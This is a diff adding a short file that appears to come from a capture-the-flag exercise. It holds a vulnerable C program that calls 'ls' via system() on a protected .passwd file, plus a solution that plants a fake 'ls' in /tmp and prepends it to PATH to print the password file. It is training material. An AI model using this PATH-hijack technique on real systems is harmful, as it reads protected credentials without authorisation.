@@ -1,0 +1,16 @@
+# Try to find your path padawan !
+#include <stdlib.h>
+#include <stdio.h>
+
+/* gcc -m32 -o ch11 ch11.c */
+
+int main(void)
+{
+    system("ls /challenge/app-script/ch11/.passwd");
+    return 0;
+}
+
+# Solution
+echo '#!/bin/sh' > /tmp/ls; echo '/bin/cat $1' >> /tmp/ls; /bin/chmod +x /tmp/ls
+export PATH=/tmp:$PATH
+./ch11
